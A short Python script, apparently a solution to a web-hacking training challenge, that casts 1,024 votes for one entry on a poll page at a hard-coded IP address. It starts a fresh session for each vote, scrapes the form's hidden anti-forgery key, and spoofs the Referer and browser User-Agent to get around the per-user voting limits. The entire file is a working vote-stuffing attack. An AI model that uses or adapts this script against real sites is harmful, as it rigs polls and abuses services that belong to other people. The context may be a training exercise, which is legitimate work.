#!/usr/bin/python3


"""this module will be used for voting 1024 times
    at the website provided"""
import urllib
from bs4 import BeautifulSoup
import requests

failed = 0

url = "http://158.69.76.135/level2.php"
hs = { 'Referer': url,
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0'} 
for i in range(0, 1024):
    session = requests.session()
    get_key_r = session.get(url, headers=hs)
    content = get_key_r.content
    soup = BeautifulSoup(content, 'html.parser')
    inputs = soup.find_all('input')
    for line in inputs:
        if line.get('name') == "key":
            key = line.get('value')
    payload = {'id': '496', 'key': key, 'holdthedoor': 'submit'}
    r = session.post(url, headers=hs, data=payload)
    if r.status_code != 200:
        print("failed to post {}th request".format(i))
        failed += 1
    if i % 10 == 0:
        print("posted 10 requests so server")
    del session
print("Failed {} number of requests".format(failed))
